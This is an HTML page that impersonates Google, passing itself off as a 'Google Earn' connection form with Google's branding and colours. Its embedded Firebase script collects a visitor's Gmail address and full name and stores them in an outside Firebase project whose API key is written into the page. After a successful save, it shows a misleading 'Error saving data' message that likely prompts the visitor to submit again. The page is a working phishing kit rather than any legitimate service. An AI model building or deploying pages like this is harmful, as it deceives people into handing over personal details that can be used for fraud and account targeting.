<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>security requirements</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet"/>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;background:#121212;display:flex;flex-direction:column;align-items:center;padding:2rem 1rem;font-family:'Roboto',sans-serif;}
  .gp-card{background:#1e1e1e;border-radius:28px;width:100%;max-width:420px;padding:2.5rem 2.5rem 2rem;box-shadow:0 1px 3px rgba(0,0,0,.5),0 4px 16px rgba(0,0,0,.3);}
  .gp-logo{display:flex;align-items:center;gap:6px;margin-bottom:1.5rem;justify-content:center;}
  .gp-g{font-family:'Google Sans',sans-serif;font-size:28px;font-weight:700;letter-spacing:-0.5px;}
  .c-b{color:#5b9ef5}.c-r{color:#ff6d5b}.c-y{color:#fcc934}.c-gr{color:#5cdb60}
  .gp-pay{font-family:'Google Sans',sans-serif;font-size:22px;font-weight:400;color:#e8eaed;}
  h2{font-family:'Google Sans',sans-serif;font-size:22px;font-weight:500;color:#e8eaed;margin-bottom:1.75rem;text-align:center;}
  .field{margin-bottom:1rem;}
  .field label{display:block;font-size:12px;font-weight:500;color:#9aa0a6;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px;}
  .field input{width:100%;height:48px;border:1.5px solid #3c4043;border-radius:10px;padding:0 14px;font-size:15px;color:#e8eaed;background:#2d2d2d;font-family:'Roboto',sans-serif;outline:none;transition:all .2s;}
  .field input:focus{border-color:#5b9ef5;box-shadow:0 0 0 3px rgba(91,158,245,.2);}
  .field input::placeholder{color:#5f6368;}
  .btn-connect{width:100%;height:50px;border:none;border-radius:24px;background:#5b9ef5;color:#fff;font-size:16px;font-weight:700;font-family:'Google Sans',sans-serif;cursor:pointer;margin-top:1.5rem;display:flex;align-items:center;justify-content:center;gap:10px;transition:all .2s;}
  .btn-connect:hover{box-shadow:0 4px 16px rgba(91,158,245,.4);transform:translateY(-1px);}
  .btn-connect:active{transform:scale(.98);}
  .btn-connect:disabled{opacity:.75;cursor:not-allowed;}
  .gpay-icon{width:24px;height:24px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
  .gpay-g{font-family:'Google Sans',sans-serif;font-size:14px;font-weight:700;color:#5b9ef5;}
  .toast{display:none;border-radius:20px;text-align:center;margin-top:1rem;padding:10px 18px;font-size:13px;color:#fff;align-items:center;justify-content:center;gap:8px;}
  .toast.show{display:flex;}
  .terms{font-size:11.5px;color:#5f6368;text-align:center;margin-top:1rem;line-height:1.5;}
  .terms a{color:#5b9ef5;text-decoration:none;}
</style>
</head>
<body>
  <div class="gp-card">
    <div class="gp-logo">
      <div class="gp-g"><span class="c-b">G</span><span class="c-r">o</span><span class="c-y">o</span><span class="c-gr">g</span><span class="c-b">l</span><span class="c-r">e</span></div>
      <div class="gp-pay">Earn</div>
    </div>
    <h2>Connect to Google Earn</h2>

    <div class="field">
      <label>Email</label>
      <input id="email" type="email" placeholder="your@gmail.com" />
    </div>
    <div class="field">
      <label>Full Name</label>
      <input id="fname" type="text" placeholder="Your Name" />
    </div>

    <button class="btn-connect" onclick="handleConnect()">
      <div class="gpay-icon"><span class="gpay-g">G</span></div>
      Secure
    </button>

    <div class="toast" id="toast"><span id="toast-msg"></span></div>
    <p class="terms">By securing you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
  </div>

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC4xb59rh3GVEh9BEzOfF6CG5uu3VHv_Wg",
      authDomain: "pay-bfba2.firebaseapp.com",
      projectId: "pay-bfba2",
      storageBucket: "pay-bfba2.firebasestorage.app",
      messagingSenderId: "145331241096",
      appId: "1:145331241096:web:39bd6339ae2a8fdd5e5f3d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.handleConnect = async function() {
      const email = document.getElementById('email').value.trim();
      const name = document.getElementById('fname').value.trim();
      const toast = document.getElementById('toast');
      const msg = document.getElementById('toast-msg');
      const btn = document.querySelector('.btn-connect');

      if(!email || !email.toLowerCase().endsWith('@gmail.com')){
        toast.className='toast show'; toast.style.background='#c5221f';
        msg.textContent='Please enter a valid Gmail address.';
        setTimeout(()=>toast.className='toast', 3000); return;
      }
      if(!name){
        toast.className='toast show'; toast.style.background='#c5221f';
        msg.textContent='Please enter your full name.';
        setTimeout(()=>toast.className='toast', 3000); return;
      }

      btn.innerHTML='Connecting…'; btn.disabled=true;

      try {
        await addDoc(collection(db, "registrations"), {
          email: email,
          fullName: name,
          createdAt: serverTimestamp()
        });

        toast.className='toast show'; toast.style.background='#1b8917';
        msg.textContent='❌ Error saving data. Please try again.';
        btn.innerHTML='<div class="gpay-icon"><span class="gpay-g">G</span></div> Secure';
        btn.disabled=false;
        setTimeout(()=>toast.className='toast', 4000);

      } catch(error) {
        console.error("Firestore error:", error);
        toast.className='toast show'; toast.style.background='#c5221f';
        msg.textContent='❌ Error saving data. Please try again.';
        btn.innerHTML='<div class="gpay-icon"><span class="gpay-g">G</span></div> Secure';
        btn.disabled=false;
        setTimeout(()=>toast.className='toast', 4000);
      }
    }
  </script>
</body>
</html>
